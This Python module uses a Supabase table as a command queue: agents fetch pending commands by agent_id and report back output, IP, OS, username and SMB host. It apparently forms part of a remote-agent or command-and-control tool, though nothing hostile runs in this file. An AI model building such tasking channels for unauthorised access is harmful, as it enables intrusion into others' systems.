from supabase import create_client
from .config import supabase, SUPABASE_URL, SUPABASE_KEY
from .retry_utils import with_retries

def fetch_pending_commands_for_agent(agent_id):
    """Fetch commands with status 'Pending' and a specific agent_id."""
    return with_retries(lambda: supabase.table('py2').select('*').eq('status', 'Pending').eq('agent_id', agent_id).execute())

def update_command_status(command_id, status, output='', agent_id='', ip='', os='', username='', smbhost=''):
    """Updates the status of a command in the py2 table."""
    command_data = {
        'status': status,
        'output': output,
        'agent_id': agent_id or '',
        'ip': ip or '',
        'os': os or '',
    }

    # Conditionally add the 'username' and 'smbhost' fields
    if username:
        command_data['username'] = username
    if smbhost:
        command_data['smbhost'] = smbhost

    with_retries(lambda: supabase.table('py2').update(command_data).eq('id', command_id).execute())
